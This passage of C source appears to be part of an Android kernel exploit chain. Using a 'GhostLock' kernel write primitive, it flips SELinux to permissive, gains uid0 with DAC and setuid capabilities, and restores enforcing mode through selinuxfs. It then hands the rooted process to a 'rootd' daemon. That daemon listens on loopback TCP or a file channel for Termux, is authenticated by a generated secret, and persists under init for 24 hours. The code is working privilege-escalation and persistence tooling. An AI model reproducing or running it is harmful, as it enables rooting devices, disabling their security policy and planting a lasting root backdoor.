     * CAP_DAC_OVERRIDE|CAP_DAC_READ_SEARCH, so the LEGITIMATE selinuxfs write
     * works (fact 674, observed) -- no extra GhostLock shot, no reverse write
     * that could touch the neighbouring selinux_state bytes.
     * glx_p11 (intent 696 fix ④): this block is now evaluated BEFORE the
     * permset stop.  glx_p10 returned 0 from the stop stage first, so a
     * --stop-after=permset + --perm-fallback=n9 run left the WHOLE BOARD
     * permissive and only a cold start could restore it (hint 639).  The
     * restore costs no GhostLock shot and runs only when N9 actually fired,
     * so a plain PERM run is byte-for-byte unaffected. */
    if (g_n9_used) {
        int r = restore_enforce_selinuxfs("N10_LEGIT");
        res("N10_LEGIT", r == 0,
            "selinuxfs /sys/fs/selinux/enforce write=1 + readback (uid0+cap)");
        if (r == 0) g_enforce_off = 0;
        else L("N10_LEGIT failed -- board stays permissive until cold start "
               "(hint 639/643: tell the human a cold start restores Enforcing)");
    }
    if (PERM_STAGE("permset")) { g_perm_stopped = 1; return 0; }
    /* glx_p11i (intent 744): stage 3 is gated ONLY by
     * --stop-after=shzlaunch|shzcheck.  Default: launch right here, after
     * SETIDS/N10_LEGIT (glx_p11t placement).  With --shz-after-deliver the
     * launch is deferred to main(), AFTER delivery() == Phase B, so one
     * single run walks Phase A -> Phase B -> stage 3. */
    if (PERM_STAGE("shzlaunch") || PERM_STAGE("shzcheck")) {
        if (!g_shz_after_deliver) {
            if (stage3_shizuku() != 0) return -1;
            return 0;          /* g_perm_stopped was set by the helper */
        }
        L("SHZ stage deferred until after the delivery leg "
          "(--shz-after-deliver): Phase A done, Phase B next");
    }
    /* runtime shot-ledger assertion.
     * 16 tags (ambient tier) = 6 reads (R1,R2,R3P,R3C,R4,R5) + 5 capability
     * writes (WC1..WC5) + 5 PERM stages; 14 tags with --no-ambient.
     * A stop stage or the N9 fallback legitimately ends with a different
     * ledger, so only a full PERM run is gated. */
    /* glx_p11i: --shz-after-deliver runs the FULL chain (the stop is only
     * the launch at the very end), so the 11-shot ledger is gated then
     * even though --stop-after is set. */
    if ((!g_stop_after || g_shz_after_deliver) && !g_n9_used &&
        !g_ledger_off) {
        if (g_ambient)
            shotlog_verify(SHOTLEDGER_CHAIN, SHOTLEDGER_CHAIN_N, "chain");
        else
            shotlog_verify(SHOTLEDGER_CHAIN_NOAMB, SHOTLEDGER_CHAIN_NOAMB_N,
                           "chain-noamb");
    } else {
        L("SHOTLEDGER[chain] not gated (--stop-after=%s n9_fallback=%d "
          "readback_verification=%d shots=%d)",
          g_stop_after ? g_stop_after : "-", g_n9_used, g_ledger_off,
          g_shotlog_n);
    }
    return g_fails ? -1 : 0;
}

/* gl backend write with shot accounting */
static int w8(unsigned long target, unsigned long value)
{
#ifdef GLX_UT
    if (ut_w8_hook) return ut_w8_hook(target, value);
#endif
    if (g_qemu) {
        char cmd[128];
        g_shots++;
        snprintf(cmd, sizeof(cmd), "w %lx %lx", target, value);
        if (ctl(cmd, cbuf, sizeof(cbuf)) < 0) return -1;
        L("SHOT %d GL w8 target=%016lx value=%016lx out=%.40s", g_shots, target, value, cbuf);
        return 0;
    }
    return dev_write8(target, value);
}

/* glx_p10 (intent 676; merged i552u/fact 674): the restore that actually
 * works is the LEGITIMATE selinuxfs write performed by the in-process
 * uid0+cap cred: open(/sys/fs/selinux/enforce, O_WRONLY); write("1"); read the
 * SAME file back (sel_read_enforce() -> state->enforcing).  Do NOT trust the
 * libselinux/status-page snapshot: a GhostLock write of selinux_state is
 * invisible to it.  Returns 0 on write==1 + readback '1'. */
static int restore_enforce_selinuxfs(const char *why)
{
    char e[32];
    int fd, w, n;
    errno = 0;
    fd = open("/sys/fs/selinux/enforce", O_WRONLY);
    w = fd >= 0 ? (int)write(fd, "1", 1) : -errno;
    if (fd >= 0) close(fd);
    e[0] = 0;
    n = rd_file("/sys/fs/selinux/enforce", e, sizeof(e));
    L("RESTORE_ENFORCE why=%s open=%d write=%d errno=%d readback='%s' rc=%d",
      why, fd, w, errno, n >= 0 ? e : "?", n);
    return (w == 1 && n > 0 && e[0] == '1') ? 0 : -1;
}

/* P5 (intent 598): N9 leaves the board permissive.  Every failure path after
 * that MUST try to put enforcing back.  glx_p10 tries the working selinuxfs
 * path first; the old +9 GhostLock write stays only as a last resort. */
static void enforce_restore(struct chain *C, const char *where)
{
    char e[32];
    int n;
    e[0] = 0;
    n = rd_file("/sys/fs/selinux/enforce", e, sizeof(e));
    if (n >= 0 && e[0] == '1') {
        L("%s enforce already 1 (no restore shot)", where);
        return;
    }
    if (restore_enforce_selinuxfs(where) == 0) {
        g_enforce_off = 0;
        return;
    }
    if (!C || !C->p0) {
        L("%s enforce=%s CANNOT be restored (no P0) -- device stays permissive "
          "until the next self-reset", where, n >= 0 ? e : "?");
        return;
    }
    L("%s enforce=%s -> restore w8(%016lx, %016lx)", where, n >= 0 ? e : "?",
      C->p0 + 9, A_state + 1);
    if (w8(C->p0 + 9, A_state + 1) != 0)
        L("%s enforce restore write FAILED -- stays permissive until self-reset",
          where);
    e[0] = 0;
    n = rd_file("/sys/fs/selinux/enforce", e, sizeof(e));
    L("%s enforce after restore='%s' (rc=%d)", where, n >= 0 ? e : "?", n);
}

/* glx_p6 item ④ (594): "L1_LOAD rc>0" alone is weak.  Re-verify the blob right
 * before load_policy() so a file swapped between S0_DELTA_GATE and L1 cannot be
 * loaded unchecked.  NOTE: do not try to read /sys/fs/selinux/policy -- the
 * shell domain gets EACCES on it (fact 540); size/vers/magic/sha + the class
 * count are the file-side evidence we can actually obtain. */
static int delta_selfcheck(const char *p, char *why, int wn)
{
    struct stat st;
    unsigned char hdr[64];
    char hex[65];
    unsigned long magic = 0, slen = 0, ver = 0;
    int fd, n;

    why[0] = 0;
    if (!p || stat(p, &st) != 0) { snprintf(why, wn, "stat(%s) failed", p ? p : "?"); return -1; }
    fd = open(p, O_RDONLY);
    if (fd < 0) { snprintf(why, wn, "open errno=%d", errno); return -1; }
    memset(hdr, 0, sizeof(hdr));
    n = read(fd, hdr, sizeof(hdr));
    close(fd);
    if (n < 16) { snprintf(why, wn, "short header %d", n); return -1; }
    magic = rd32u(hdr, 0);
    slen = rd32u(hdr, 4);
    if (slen <= sizeof(hdr) - 12) ver = rd32u(hdr, (int)(8 + slen));
    if (sha256_file(p, hex) != 0) { snprintf(why, wn, "sha256 failed"); return -1; }
    if (st.st_size != (long)DEV_DELTA_SIZE || magic != POLMAGIC ||
        ver != DEV_POLICYVERS || strcmp(hex, DEV_DELTA_SHA256) != 0) {
        snprintf(why, wn, "size=%ld/%lu magic=%08lx vers=%lu sha=%s",
                 (long)st.st_size, DEV_DELTA_SIZE, magic, ver, hex);
        return -1;
    }
    snprintf(why, wn, "size=%ld magic=%08lx vers=%lu sha=%s classes=%d",
             (long)st.st_size, magic, ver, hex, class_count_selinuxfs());
    return 0;
}

/* glx_p9 (intent 662)
 * glx_p7 (fact 645③/646): build the handoff argv.  The recommended shape is
 *   execve(path, {path, "--audit-log=/data/local/tmp/rootd_audit.log", NULL},
 *          NULL)
 * rootd's gate_configure() ignores options it does not know for the uid list,
 * so the default whitelist 10369 / src=default is unchanged, while DENY/ALLOW
 * lines are persisted to the file as well as stdout.  envp MUST stay NULL:
 * ROOTD_ALLOW_UIDS in the environment would replace the whitelist (src=env).
 * --deliver-no-audit-arg restores the verified argc==1 shape.  Pure so the
 * host unit test asserts the production argv. */
static int deliver_build_argv(const char *path, int audit_off,
                              const char *audit_path, char *argbuf, size_t n,
                              char **av, int *ac)
{
    int c = 0;
    if (!path || !path[0] || !av) return -1;
    av[c++] = (char *)path;
    if (!audit_off && audit_path && audit_path[0]) {
        snprintf(argbuf, n, "--audit-log=%s", audit_path);
        av[c++] = argbuf;
    }
    av[c] = NULL;
    if (ac) *ac = c;
    return 0;
}

/* glx_p6 item ① (594 §1): hand the uid0 + u:r:shell:s0 process over to rootd.
 * Default OFF (--deliver-exec=PATH).  Ordering is mandatory: it runs only after
 * shotlog_verify("delivery") and after V4_OP_STOP, because execve() replaces
 * the image and takes the futex ring / reader shim with it.  The final RESULT
 * summary is emitted BEFORE the execve so the evidence is not lost. */
static int deliver_handoff(void)
{
    char ctx[160];
    struct capstate cs;

    if (!g_deliver_exec) return 0;
    if (!g_dev || getuid() != 0) {
        L("HANDOFF skip: dev=%d uid=%d (device-only, uid0-only)",
          g_dev, getuid());
        return 0;
    }
    memset(ctx, 0, sizeof(ctx));
    memset(&cs, 0, sizeof(cs));
    self_ctx(ctx, sizeof(ctx));
    cap_get_self(&cs);
    cs.bnd = cap_bset_bits();
    cs.have_bnd = 1;
    L("HANDOFF|PRE|uid=%d euid=%d eff=%#lx bnd=%#lx ctx=%s",
      getuid(), geteuid(), cs.eff, cs.bnd, ctx);
    if ((cs.eff & CRED_CAP_BITS) != CRED_CAP_BITS ||
        (cs.bnd & CRED_CAP_BITS) != CRED_CAP_BITS ||
        !strstr(ctx, DOM_SHELL)) {
        res("HANDOFF_PRE", 0, "uid=%d eff=%#lx bnd=%#lx ctx=%s (want uid0 + "
            "bits %#lx + %s)", getuid(), cs.eff, cs.bnd, ctx, CRED_CAP_BITS,
            DOM_SHELL);
        return -1;
    }
    res("HANDOFF_PRE", 1, "uid=%d eff=%#lx bnd=%#lx ctx=%s", getuid(), cs.eff,
        cs.bnd, ctx);
    L("RESULT=PASS(handoff) round=%d shots=%d fails=%d vmap_base=%016lx "
      "vmap_obj=%016lx vr=%s vr_ab=%s c1_shell=%s c1_kernel=STATIC "
      "c1_init=STATIC post=%d",
      g_round, g_shots, g_fails, g_vmap_base, g_vmap_obj, g_vr_verdict,
      g_vr_ab, g_c1_shell, g_c1_post);
    printf("GLX|RESULT=PASS round=%d shots=%d vr=%s vr_ab=%s c1_shell=%s "
           "handoff=%s\n", g_round, g_shots, g_vr_verdict, g_vr_ab, g_c1_shell,
           g_deliver_exec);
    fflush(stdout);
    if (g_log) fflush(g_log);
    {
        char argbuf[192];
        char *av[3];
        int ac = 0;
        if (deliver_build_argv(g_deliver_exec, g_deliver_audit_off,
                               g_deliver_audit, argbuf, sizeof(argbuf),
                               av, &ac) != 0) {
            res("HANDOFF_FAIL", 0, "bad --deliver-exec path");
            return -1;
        }
        L("HANDOFF|EXEC|argv[0]=%s argv[1]=%s argc=%d envp=NULL",
          av[0], ac > 1 ? av[1] : "(none)", ac);
        fflush(stdout);
        if (g_log) fflush(g_log);
        execve(g_deliver_exec, av, NULL);   /* image replacement, no return */
    }
    res("HANDOFF_FAIL", 0, "execve(%s) errno=%d (ENOENT => relative path / "
        "missing; EACCES => no x bit / wrong label; ENOEXEC => not static)",
        g_deliver_exec, errno);
    return -1;
}

/* item ①②: one place decides what the C1 shell verdict means (unit-tested).
 * LIVE requires BOTH a POST=0 and that it arrived on the second connection
 * (src==1).  A POST=0 only inside the first report is an old client that could
 * not prove anything after the delta+enforcing window => PARTIAL. */
static const char *c1_shell_verdict(int post, int src)
{
    return (post == 0 && src == 1) ? "LIVE" : "PARTIAL";
}


/* ================= intent 676: zero-delta delivery leg (merged i552u/i552s)
 * fact 650: with the BASE policy (enforcing=1, no v4_delta) the ONLY two
 * bidirectional channels between a u:r:shell:s0 daemon and Termux
 * (u:r:untrusted_app_27) are 127.0.0.1 TCP (name_bind/name_connect both
 * allowed) and ordinary files in /data/local/tmp.  This leg replaces the
 * delta gate + L1_LOAD + the unix C1 listener with a spawn of the real
 * delivery daemon over one of those channels.
 *
 * Two shapes:
 *   --deliver-fork  (default partner of --zd=tcp): the EMBEDDED rootd_main()
 *                   runs in a fork()ed child with NO execve.  fork() has no
 *                   bprm, so the child keeps uid0 and every capability set
 *                   exactly as the chain left them -- this is the shape that
 *                   Termux uses (goal 223, first sentence).
 *   --zd-daemon PATH (exec shape): a standalone rootd_zd is execv()ed; only
 *                   correct on the fork+exec/ambient tier.
 *
 * Evidence model: rootd_zd emits one "ROOTD|AUDIT|ALLOW" line per accepted
 * (and authenticated) connection.  TWO ALLOW lines = the client made both
 * connections (first request + post-delivery second connection), the
 * zero-delta equivalent of the legacy POST= write-back.  The client is
 * ua27one.py:  c1tcp --port=N --secret-file=...  (TCP)
 *              rootd-selftest --chan=file --req=... --resp=...  (file)
 */

/* planner correction 683/684: the device currently rejects IP egress --
 * including 127.0.0.1 loopback -- for uid2000 and uid10369.  A UDP sendto()
 * that returns 1 (one byte queued) is the cheapest positive gate; anything
 * else means "assume IP is dead" and use the file channel. */
static int zd_ip_probe(void)
{
    int s;
    struct sockaddr_in a;
    char b = 0;
    int rc;
    s = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (s < 0) return 0;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(9);
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    rc = (int)sendto(s, &b, 1, 0, (struct sockaddr *)&a, sizeof(a));
    close(s);
    L("ZD_IP_PROBE sendto(127.0.0.1:9)=%d errno=%d -> %s", rc, errno,
      rc == 1 ? "tcp-eligible" : "IP REJECTED, file channel required");
    return rc == 1;
}

/* i701 (glx_p11d): create the shared secret as uid g_zd_secret_uid.
 *
 * The fork child only runs AFTER SETIDS, i.e. it is uid0 + CapEff 0xC6
 * (DAC_OVERRIDE|DAC_READ_SEARCH|SETGID|SETUID -- no CAP_CHOWN).  It therefore
 * cannot chown a root-owned file to Termux, and Termux cannot create a file in
 * /data/local/tmp (TE: untrusted_app_27 -> shell_data_file has no create /
 * add_name).  The one place Termux owns is its own home, so: PR_SET_KEEPCAPS,
 * setresgid/setresuid(10369), write 64 hex chars with mode 0600.  The file is
 * owner-Termux by construction; other apps get EACCES; rootd reads it back
 * through CAP_DAC_OVERRIDE|CAP_DAC_READ_SEARCH (i552y a-4: TE+MLS allowed).
 * Only the PATH is ever printed, never the bytes. */
static int zd_secret_provision(uid_t uid)
{
    pid_t p;
    int st = 0;

    p = fork();
    if (p < 0) { L("ZD secret provision fork errno=%d", errno); return -1; }
    if (p == 0) {
        int fd, i, ok = 1;
        unsigned char r[32];
        char hex[65];
        int cf;

        for (cf = 3; cf < 1024; cf++) close(cf);
        (void)prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
        if (setresgid(uid, uid, uid) != 0) _exit(1);
        if (setresuid(uid, uid, uid) != 0) _exit(2);
        fd = open("/dev/urandom", O_RDONLY | O_CLOEXEC);
        if (fd < 0) _exit(3);
        if (read(fd, r, sizeof(r)) != (ssize_t)sizeof(r)) { close(fd); _exit(4); }
        close(fd);
        for (i = 0; i < 32; i++)
            snprintf(hex + 2 * i, 3, "%02x", (unsigned)r[i]);
        fd = open(g_zd_secret_file, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
        if (fd < 0) _exit(5);
        if (write(fd, hex, 64) != 64) ok = 0;
        if (fchmod(fd, 0600) != 0) ok = 0;
        close(fd);
        _exit(ok ? 0 : 6);
    }
    waitpid(p, &st, 0);
    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
        L("ZD secret provision as uid=%u failed (status=%d exit=%d)",
          (unsigned)uid, st, WIFEXITED(st) ? WEXITSTATUS(st) : -1);
        return -1;
    }
    return 0;
}

/* i775 (intent 775): the secret is only usable if it is EXACTLY what the
 * Termux client can read and no other app can: >=32 bytes, mode 0600, owner
 * == the uid the client will run as (default 10369).  glx_p11m merely WARNed
 * about a world-readable secret and then claimed mode=0600 in its PASS line;
 * that is a silent security downgrade AND a false evidence row.  Now it is a
 * fail-closed gate with the reason spelled out. */
static const char *zd_secret_problem(const struct stat *st)
{
    if (st->st_size < 32) return "too_short(<32B)";
    if ((st->st_mode & 077) != 0) return "mode_not_0600";
    if (g_zd_secret_uid >= 0 && (uid_t)st->st_uid != (uid_t)g_zd_secret_uid)
        return "owner_not_termux_uid";
    return NULL;
}

static int zd_make_secret(void)
{
    struct stat st;
    const char *bad;

    if (stat(g_zd_secret_file, &st) == 0) {
        bad = zd_secret_problem(&st);
        if (!bad) {
            L("ZD secret reused: %s mode=%o size=%ld uid=%u", g_zd_secret_file,
              (unsigned)(st.st_mode & 07777), (long)st.st_size,
              (unsigned)st.st_uid);
            return 0;
        }
        L("ZD secret REJECTED: %s mode=%o size=%ld uid=%u reason=%s "
          "(want mode=0600 uid=%d size>=32)",
          g_zd_secret_file, (unsigned)(st.st_mode & 07777),
          (long)st.st_size, (unsigned)st.st_uid, bad, g_zd_secret_uid);
        printf("GLX|ZD|SECRET_GATE=FAIL|path=%s|reason=%s|mode=%04o|size=%ld|"
               "uid=%u|want_uid=%d\n", g_zd_secret_file, bad,
               (unsigned)(st.st_mode & 07777), (long)st.st_size,
               (unsigned)st.st_uid, g_zd_secret_uid);
        fflush(stdout);
        return -1;
    }
    if (g_zd_secret_uid >= 0) {
        L("ZD secret absent -> provisioning %s as uid=%d 0600",
          g_zd_secret_file, g_zd_secret_uid);
        if (zd_secret_provision((uid_t)g_zd_secret_uid) == 0 &&
            stat(g_zd_secret_file, &st) == 0) {
            bad = zd_secret_problem(&st);
            if (!bad) {
                L("ZD secret provisioned: %s mode=%o size=%ld uid=%u",
                  g_zd_secret_file, (unsigned)(st.st_mode & 07777),
                  (long)st.st_size, (unsigned)st.st_uid);
                return 0;
            }
            L("ZD secret provisioned but REJECTED: reason=%s mode=%o uid=%u",
              bad, (unsigned)(st.st_mode & 07777), (unsigned)st.st_uid);
        }
    }
    printf("GLX|ZD|SECRET_MISSING=%s|HUMAN_ACTION=create it inside Termux first:\n"
           "  python3 -c \"import os;open(os.path.expanduser('~')+'/zd_secret','w')"
           ".write(os.urandom(32).hex())\"; chmod 600 ~/zd_secret\n",
           g_zd_secret_file);
    fflush(stdout);
    return -1;
}

/* Spawn the delivery daemon and verify the channel from the OUTSIDE:
 * LISTENING line (name_bind/name_connect proof) + optional ALLOW audit lines.
 * On success the child STAYS ALIVE: it is the delivered uid0 daemon.
 *
 * i775 (intent 775) -- the one-line field bug of round 71 (fact 774):
 * glx_p11m evaluated its success predicate only AFTER a SUCCESSFUL poll():
 *
 *     pr = poll(&pp, 1, 200);
 *     if (pr <= 0) continue;          <-- swallowed the whole gate
 *     ...
 *     if (have_listen && (allows >= 1 || time(NULL) - t0 >= 1)) { rc = 0; break; }
 *
 * The REAL daemon shape is "print ROOTD|LISTENING once, then stay silent
 * until a client connects".  Every following poll() timed out, the `continue`
 * skipped the predicate, the 10 s deadline expired and the parent returned
 * rc=-1 -> DELIVERY_FAIL/EXIT=2 **and killed a perfectly working uid0
 * daemon**.  That is exactly what happened in round 71 (the DELIVER line was
 * printed because the LISTENED line had been seen, and the very next FAIL
 * line came from the expiry path).
 *
 * The gate is now evaluated on EVERY round -- after poll() success, timeout,
 * EINTR, short read or EAGAIN -- and a daemon that reached LISTENING is never
 * killed.  A timeout stays fail-closed but prints a specific GLX|ZD|FAIL_GATE
 * line (NO_LISTEN_TIMEOUT / NO_LISTEN_DAEMON_EXITED / NO_LISTEN_STDOUT_EOF /
 * NO_LISTEN_IO_ERROR / LISTEN_UID_NOT_ROOT / SECRET_FILE). */
static int g_zd_listen_timeout_s = 10;   /* hard wait for ROOTD|LISTENING      */
static int g_zd_listen_grace_s = 1;      /* quiet time after LISTENING = good  */
static const char *g_zd_last_fail_gate;  /* i775: last explicit gate (log/UT)  */

#ifdef GLX_UT
/* host-only fake daemon (compile-time seam; absent from the device binary) */
int (*ut_zd_child_hook)(int ac, char **av);
#endif

static void zd_fail_gate(const char *gate, const char *fmt, ...)
{
    char d[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(d, sizeof(d), fmt, ap);
    va_end(ap);
    g_zd_last_fail_gate = gate;
    printf("GLX|ZD|FAIL_GATE|%s|%s\n", gate, d);
    fflush(stdout);
    L("ZD FAIL_GATE=%s %s", gate, d);
}

/* Once ROOTD|LISTENING holds, the daemon is the deliverable: stage 3, the
 * client self-test or any later evidence failure must NEVER kill it or take
 * its socket away.  It is adopted by init (ppid=1) and keeps 10369 LISTEN as
 * uid0, so Termux can still fall back to a uid0 shell even when the Shizuku
 * leg fails -- the boot is not wasted. */
static void zd_persist_note(const char *why)
{
    if (g_zd_pid <= 0) return;
    printf("GLX|ZD_PERSIST|pid=%d|KEEP=1|reason=%s|revoke=kill -" "9 %d\n",
           (int)g_zd_pid, why, (int)g_zd_pid);
    fflush(stdout);
    L("ZD_PERSIST rootd pid=%d kept alive (%s); never killed after LISTENING",
      (int)g_zd_pid, why);
}

static int zd_spawn_verify(void)
{
    int pfd[2];
    pid_t p;
    char line[768];
    char buf[4096];
    size_t used = 0;
    int have_listen = 0, allows = 0, rc = -1;
    int listen_uid = -1, listen_euid = -1;
    int eof = 0, read_errno = 0, poll_errno = 0;
    time_t t0, tseen = 0;
    char opt_dir[600], opt_sec[600], opt_port[64], opt_tag[160];
    char *av[20];
    int ac = 0;

    if (!g_deliver_fork && (!g_zd_daemon || !*g_zd_daemon)) {
        res("ZD_DAEMON", 0, "no --zd-daemon/--deliver-exec path (and no --deliver-fork)");
        return -1;
    }
    if (zd_make_secret() != 0) {
        res("ZD_SECRET", 0, "cannot create/validate %s", g_zd_secret_file);
        zd_fail_gate("SECRET_FILE", "path=%s (missing/unprovable; see the "
                     "SECRET_MISSING human action)", g_zd_secret_file);
        return -1;
    }
    {
        struct stat sst;
        const char *bad;
        if (stat(g_zd_secret_file, &sst) != 0) {
            res("ZD_SECRET", 0, "stat(%s) errno=%d", g_zd_secret_file, errno);
            zd_fail_gate("SECRET_FILE", "path=%s errno=%d", g_zd_secret_file,
                         errno);
            return -1;
        }
        bad = zd_secret_problem(&sst);
        res("ZD_SECRET", bad == NULL,
            "file=%s mode=%04o size=%ld uid=%u reason=%s (bytes never printed)",
            g_zd_secret_file, (unsigned)(sst.st_mode & 07777),
            (long)sst.st_size, (unsigned)sst.st_uid, bad ? bad : "ok");
        if (bad) {
            zd_fail_gate("SECRET_FILE", "path=%s reason=%s mode=%04o uid=%u",
                         g_zd_secret_file, bad,
                         (unsigned)(sst.st_mode & 07777),
                         (unsigned)sst.st_uid);
            return -1;
        }
    }

    if (g_zd_chan == 2) {
        struct stat dst;
        if (stat(g_zd_dir, &dst) != 0 || !S_ISDIR(dst.st_mode)) {
            res("ZD_DIR", 0, "%s missing/not a dir -- create it in Termux first "
                "(mkdir -p ~/zd_chan; chmod 700 ~/zd_chan)", g_zd_dir);
            zd_fail_gate("FILE_CHANNEL_DIR", "%s missing/not a dir", g_zd_dir);
            return -1;
        }
        res("ZD_DIR", 1, "file channel dir=%s tag=%s", g_zd_dir, g_zd_tag);
    }
    if (pipe(pfd) != 0) {
        res("ZD_PIPE", 0, "pipe errno=%d", errno);
        zd_fail_gate("PIPE", "pipe errno=%d", errno);
        return -1;
    }
    p = fork();
    if (p < 0) {
        close(pfd[0]); close(pfd[1]);
        res("ZD_FORK", 0, "fork errno=%d", errno);
        zd_fail_gate("FORK", "fork errno=%d", errno);
        return -1;
    }
    if (p == 0) {
        int cf;
        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[0]); close(pfd[1]);
        /* The daemon must NOT hold the parent's fds: the perf events, the
         * pmsg mapping and the @glx-shell-454 listener would otherwise stay
         * alive for the whole daemon lifetime (fact 628: an orphan listener
         * makes the next run fail with EADDRINUSE).  Keep 0/1/2 only. */
        for (cf = 3; cf < 1024; cf++) close(cf);
        snprintf(opt_dir, sizeof(opt_dir), "--dir=%s", g_zd_dir);
        snprintf(opt_sec, sizeof(opt_sec), "--secret-file=%s", g_zd_secret_file);
        snprintf(opt_port, sizeof(opt_port), "--port=%d", g_zd_port);
        snprintf(opt_tag, sizeof(opt_tag), "--tag=%s", g_zd_tag);
        av[ac++] = (char *)(g_deliver_fork ? "rootd_fork" : g_zd_daemon);
        av[ac++] = (char *)(g_zd_chan == 2 ? "--listen=file" : "--listen=tcp");
        if (g_zd_chan == 2) { av[ac++] = opt_dir; av[ac++] = opt_tag; }
        else av[ac++] = opt_port;
        av[ac++] = opt_sec;
        /* i775: 24 h instead of 300 s.  The human Termux step (open Termux,
         * paste the block) routinely takes longer than 5 minutes, and a
         * daemon that went IDLE_TIMEOUT before the fallback client arrives
         * is another wasted clean boot.  A power cycle still removes it. */
        av[ac++] = (char *)"--idle=86400";
        av[ac++] = (char *)"--max-conn=32";
        av[ac++] = (char *)"--dac-caps";   /* negctl is readable by design */
        /* i775: startup assertions are DIAGNOSTICS, not a spawn gate.  In
         * the --deliver-exec (execve) shape the bprm credential recompute can
         * legitimately leave CapEff without the DAC bits (no ambient tier);
         * vr_0600/exec_shell then failed and rootd aborted BEFORE listening
         * -- fact 645's main false-failure source.  With --soft-assert every
         * assertion still prints PASS/FAIL evidence but can never prevent a
         * uid0 daemon from listening.  The hard identity check that matters
         * is the parent-side LISTEN uid=0 gate below. */
        av[ac++] = (char *)"--soft-assert";
        av[ac] = NULL;
#ifdef GLX_UT
        if (ut_zd_child_hook) _exit(ut_zd_child_hook(ac, av));
#endif
        if (g_deliver_fork) {
            /* path A: no execve -- no bprm, no cap recomputation.  The
             * embedded rootd runs in-process and keeps uid0 + all cap sets. */
            int rr = rootd_main(ac, av);
            _exit(rr < 0 ? 1 : rr);
        }
        execv(g_zd_daemon, av);
        _exit(127);
    }
    close(pfd[1]);
    g_zd_pid = p;
    (void)fcntl(pfd[0], F_SETFL, fcntl(pfd[0], F_GETFL, 0) | O_NONBLOCK);
    t0 = time(NULL);

    while (time(NULL) - t0 < g_zd_listen_timeout_s) {
        struct pollfd pp = { pfd[0], POLLIN, 0 };
        int pr = poll(&pp, 1, 200);
        if (pr > 0) {
            ssize_t r = read(pfd[0], buf + used, sizeof(buf) - 1 - used);
            if (r > 0) {
                used += (size_t)r;
                buf[used] = 0;
                for (;;) {
                    char *nl = memchr(buf, '\n', used);
                    size_t ln;
                    if (!nl) break;
                    ln = (size_t)(nl - buf);
                    if (ln >= sizeof(line)) ln = sizeof(line) - 1;
                    memcpy(line, buf, ln);
                    line[ln] = 0;
                    memmove(buf, nl + 1, used - (size_t)(nl - buf) - 1);
                    used -= (size_t)(nl - buf) + 1;
                    if (strstr(line, "ROOTD|LISTENING")) {
                        const char *pu = strstr(line, "|uid=");
                        const char *pe = strstr(line, " euid=");
                        const char *pp2 = strstr(line, "127.0.0.1:");
                        have_listen = 1;
                        tseen = time(NULL);
                        listen_uid = pu ? atoi(pu + 5) : -1;
                        listen_euid = pe ? atoi(pe + 6) : -1;
                        if (pp2) g_zd_port_live = atoi(pp2 + 10);
                        printf("GLX|ZD|%s\n", line);
                    } else if (strstr(line, "ROOTD|AUDIT|ALLOW")) {
                        allows++;
                        printf("GLX|ZD|ALLOW#%d|%s\n", allows, line);
                    } else if (strstr(line, "ROOTD|") && strstr(line, "FAIL")) {
                        printf("GLX|ZD|%s\n", line);
                    } else if (g_verbose) {
                        printf("GLX|ZD|%s\n", line);
                    }
                    fflush(stdout);
                }
            } else if (r == 0) {
                eof = 1;                 /* daemon closed stdout */
            } else if (errno != EAGAIN && errno != EWOULDBLOCK &&
                       errno != EINTR) {
                read_errno = errno;
            }
        } else if (pr < 0 && errno != EINTR) {
            poll_errno = errno;
        }
        /* i775: THE fix.  Evaluated on every round, no matter what poll() or
         * read() returned.  The real daemon is silent after LISTENING, so
         * this is the ONLY round that can ever turn rc into 0. */
        if (have_listen &&
            (allows >= 1 || time(NULL) - tseen >= g_zd_listen_grace_s)) {
            rc = 0;
            break;
        }
        if (eof && have_listen) { rc = 0; break; }
        if (eof && !have_listen) break;   /* nothing more can arrive */
    }
    close(pfd[0]);
    if (g_zd_port_live < 0) g_zd_port_live = g_zd_port;
    res("ZD_LISTEN", have_listen,
        "chan=%s daemon=%s pid=%d port=%d (name_bind/name_connect under BASE "
        "policy; listen_uid=%d euid=%d)",
        g_zd_chan == 2 ? "file" : "tcp",
        g_deliver_fork ? "embedded:rootd_main(fork,no-exec)" : g_zd_daemon,
        (int)p, g_zd_port_live, listen_uid, listen_euid);
    if (have_listen) {
        char ctx[160] = "";
        self_ctx(ctx, sizeof(ctx));
        /* i775 machine anchor: the delivery leg's single hard claim. */
        printf("GLX|ROOTD_LISTEN|PASS|pid=%d|port=%d|uid=%d|euid=%d|"
               "ppid_after_exit=1|chan=%s\n", (int)p, g_zd_port_live,
               listen_uid, listen_euid, g_zd_chan == 2 ? "file" : "tcp");
        printf("GLX|DELIVER|chan=%s|child_pid=%d|ppid_after_exit=1|port=%d|"
               "secret=%s|secret_uid=%d|auth=%s|exec=NO|ctx=%s|"
               "allow_lines=%d|revoke=kill -" "9 %d\n",
               g_zd_chan == 2 ? "file" : "tcp", (int)p, g_zd_port_live,
               g_zd_secret_file, g_zd_secret_uid,
               g_zd_chan == 2 ? "secret-file" : "ZD1-secret-first-line",
               ctx, allows, (int)p);
        /* i775(b): the Termux-readable secret must still be there with the
         * same owner/mode after the daemon owns the channel -- rootd reads it
         * through DAC caps but never changes it, so the fallback client can
         * use the very same file after init adopts the daemon (ppid=1). */
        {
            struct stat sst;
            if (stat(g_zd_secret_file, &sst) == 0)
                printf("GLX|ZD_SECRET|POST_LISTEN|path=%s|mode=%04o|uid=%u|"
                       "size=%ld|termux_readable=%d\n", g_zd_secret_file,
                       (unsigned)(sst.st_mode & 07777), (unsigned)sst.st_uid,
                       (long)sst.st_size,
                       ((sst.st_mode & 077) == 0 &&
                        (g_zd_secret_uid < 0 ||
                         (uid_t)sst.st_uid == (uid_t)g_zd_secret_uid)) ? 1 : 0);
            else
                printf("GLX|ZD_SECRET|POST_LISTEN|path=%s|errno=%d|"
                       "termux_readable=0\n", g_zd_secret_file, errno);
        }
        fflush(stdout);
    }
    /* i701: ALLOW lines are evidence, not a gate.  With a TCP client the
     * SO_PEERCRED identity is unavailable on AF_INET (measured: rc=0 but
